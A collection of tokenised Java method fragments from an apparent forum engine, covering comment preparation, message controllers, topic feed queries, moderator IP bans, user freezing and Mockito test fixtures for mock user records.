protected ModelAndView getData ( HttpServletRequest request ) throws Exception { final Poll poll = pollDao . getMostRecentPoll ( ) ; Topic msg = messageDao . getById ( poll . getTopic ( ) ) ; int count = pollDao . getVotersCount ( poll . getId ( ) ) ; int countUsers = pollDao . getCountUsers ( poll ) ; ModelAndView result = new ModelAndView ( " boxlets/poll " ) ; result . addObject ( " poll " , poll ) ; result . addObject ( " count " , count ) ; result . addObject ( " message " , msg ) ; result . addObject ( " countUsers " , countUsers ) ; return result ; } 
public boolean hasAnswers ( ) { return ! childs . isEmpty ( ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = list . stream ( ) . map ( comment - > { MessageText text = texts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } return prepareComment ( text , author , remarkText , comment , comments , tmpl , topic ) ; } ) . collect ( Collectors . toList ( ) ) ; return commentsPrepared ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , null , null , ImmutableSet . of ( ) ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template tmpl , @Nonnull Topic topic , Set < Integer > hideSet ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = list . stream ( ) . map ( comment - > { MessageText text = texts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } return prepareComment ( text , author , remarkText , comment , comments , tmpl , topic , hideSet ) ; } ) . collect ( Collectors . toList ( ) ) ; return commentsPrepared ; } 
public void foreach ( Consumer < Comment > consumer ) { if ( comment ! = null ) { consumer . accept ( comment ) ; } for ( CommentNode child : childs ) { child . foreach ( consumer ) ; 
private void hideNode ( Set < Integer > hideSet ) { foreach ( c - > hideSet . add ( c . getId ( ) ) ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template tmpl , @Nonnull Topic topic , Set < Integer > hideSet ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } return list . stream ( ) . map ( comment - > { MessageText text = texts . get ( comment . getId ( ) ) ; 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , page , filter , groupName , msgid , 0 ) ; } 
public ModelAndView getMessageThread ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " threadRoot " ) int threadRoot ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , 0 , filter , groupName , msgid , threadRoot ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) throws Exception { Topic topic = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( topic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! topic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( topic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . toString ( ) ) ) ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , false ) ; } Topic topic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( topic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( topic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , null , null , ImmutableSet . of ( ) , null ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template tmpl , @Nonnull Topic topic , Set < Integer > hideSet ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } Set < Integer > samePageComments = list . stream ( ) . map ( Comment : : getId ) . collect ( Collectors . toSet ( ) ) ; return list . stream ( ) . map ( comment - > { MessageText text = texts . get ( comment . getId ( ) ) ; 
public boolean isAnswerSamepage ( ) { return answerSamepage ; } 
public CommentNode build ( ) { return new CommentNode ( comment , Lists . transform ( childs , CommentNodeBuilder : : build ) ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count , @Nullable User currentUser ) throws TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; tag= " + tag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + tech ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto , null ) ; } 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( " TopicListService.getAllTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; fromDate= " + fromDate ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; return topicListDao . getTopics ( topicListDto , null ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , ts , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public void blockIP ( String ip , int moderatorId , String reason , Timestamp banUntil , boolean allow_posting , boolean captcha_required ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + tech ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto , null ) ; } 
public void freezeUser ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason , @Nonnull Timestamp until ) { jdbcTemplate . update ( " UPDATE users SET frozen_until=?,frozen_by=?,freezing_reason=? WHERE id=? " , until , moderator . getId ( ) , reason , user . getId ( ) ) ; userLogDao . logFreezeUser ( user , moderator , reason , until ) ; } 
public void logFreezeUser ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason , @Nonnull Timestamp until ) { Timestamp now = new Timestamp ( System . currentTimeMillis ( ) ) ; UserLogAction action = UserLogAction . FROZEN ; the action may be not consistent with database (e.g. with real action) if the 'until' is close to the now, but we don't have to worry about it, since, it's not about real use cases if (until.before(now)) { action = UserLogAction.DEFROSTED; } jdbcTemplate.update( "INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?)", 
public boolean isFrozen ( ) { if ( frozenUntil = = null ) { return false ; } return frozenUntil . after ( new Timestamp ( System . currentTimeMillis ( ) ) ) ; } 
public boolean isCommentsAllowed ( Group group , Topic topic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) | | topic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public static ResultSet getHizel ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 34590 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " hizel " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " DffBkILVpGCDTC8ykceJzvcj5dJbhF38 " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( " " ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( " hz@vyborg.ru " ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 0 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getAnonymous ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " anonymous " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 161 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getModerator ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " svu " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 2 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user5star " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user1star " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user45score " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " userBlocked " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( true ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUserDefrosted ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 1488 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " defrosted " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Defrosted " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 15 ) ; Timestamp past = new Timestamp ( System . currentTimeMillis ( ) - 1000 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( past ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 1 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " just because " ) ; return resultSet ; } 
